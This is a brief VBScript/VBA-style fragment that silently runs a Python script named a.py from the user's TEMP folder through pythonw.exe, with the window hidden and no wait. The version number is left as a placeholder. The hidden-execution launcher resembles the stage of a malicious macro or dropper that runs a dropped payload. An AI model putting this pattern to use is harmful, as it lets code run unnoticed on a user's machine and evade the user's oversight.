Set objShell = CreateObject("WScript.Shell")
tempPath = Environ("TEMP") & "\a.py"
pythonPath = Environ("USERPROFILE") & "\AppData\Local\Programs\Python\Python<version>\pythonw.exe"
objShell.Run """" & pythonPath & """ """ & tempPath & """", 0, False
